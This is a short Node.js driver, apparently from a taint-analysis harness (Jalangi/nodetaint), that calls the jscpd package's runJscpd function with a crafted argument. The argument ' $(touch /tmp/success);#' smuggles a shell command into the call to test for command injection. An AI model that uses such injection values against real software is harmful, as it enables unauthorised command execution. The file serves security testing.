// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/jscpd/node_modules/jscpd');
try {
	var x0 = {};
var x1 = " $(touch /tmp/success);#";
new PUT["runJscpd"](x0,x1)();
} catch (e) {
	console.log(e);
}